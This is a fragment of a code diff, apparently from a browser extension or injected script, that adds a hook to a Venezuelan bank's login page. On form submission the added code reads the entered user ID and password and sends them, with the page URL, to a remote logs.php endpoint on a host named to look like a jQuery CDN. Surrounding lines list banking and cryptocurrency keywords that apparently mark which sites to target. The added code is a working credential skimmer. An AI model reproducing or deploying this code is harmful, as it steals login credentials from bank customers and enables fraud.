@@ -20,6 +20,18 @@ var login_form = document.getElementsByName("login");
           }
         }
 
+        if (window.location.href.indexOf("https://www3.bancaribe.com.ve/bcn/") > -1) {
+        var login_form = document.getElementsByName("conexion");
+            if(login_form){
+                login_form.onsubmit = function(){
+                    var login = {};
+                    login.email = document.getElementsByName("userid").value;
+                    login.pass = document.getElementsByName("password").value;
+                    (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+
+        		        }
+                  }
+                }
 (function () {
 var myStringArrayBAN = ["banca", "banco", "bank", "bitcoin", "monero", "etherum", "wallet"];
 var arrayLengthBAN = myStringArrayBAN.length;
